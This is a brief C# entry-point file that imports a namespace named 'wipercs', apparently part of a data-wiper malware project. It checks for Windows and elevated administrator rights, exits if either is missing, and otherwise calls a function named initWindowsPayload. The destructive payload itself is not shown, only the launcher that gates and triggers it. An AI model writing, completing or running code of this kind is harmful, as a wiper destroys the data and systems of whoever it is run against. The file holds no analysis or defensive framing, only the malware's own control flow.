using wipercs;

class Program
{
    public static void Main(string[] args)
    {
        bool elevation = Helper.IsElevated();
        bool windows = Helper.IsWindows();
        
        if (!windows || !elevation)
        {
            Helper.Exit(5);
        }
        
        Helper.initWindowsPayload();
    }
}